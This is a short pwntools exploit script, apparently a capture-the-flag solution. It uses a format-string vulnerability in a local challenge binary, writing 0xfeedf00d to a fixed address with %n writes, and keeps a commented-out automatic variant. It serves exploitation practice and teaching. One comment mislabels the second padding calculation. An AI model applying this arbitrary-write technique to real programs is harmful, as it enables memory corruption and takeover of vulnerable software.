#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or 'chall')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
break main
c
'''.format(**locals())

io = start()

# === Automatic ===
# payload = fmtstr_payload(6, {0x804c020: 0xfeedf00d})
# =================


# === Manual ===
payload = p32(0x804c020)
payload += p32(0x804c022)
# 8 bytes writen ^

payload += b'%61445x' # feed - 8
payload += b"%6$n"
# 0xf00d bytes written ^

payload += b'%3808x' # f00d - 0xf00d
payload += b"%7$n"
# 0xfeed bytes written ^
# ==============


io.sendline(payload)
io.interactive()

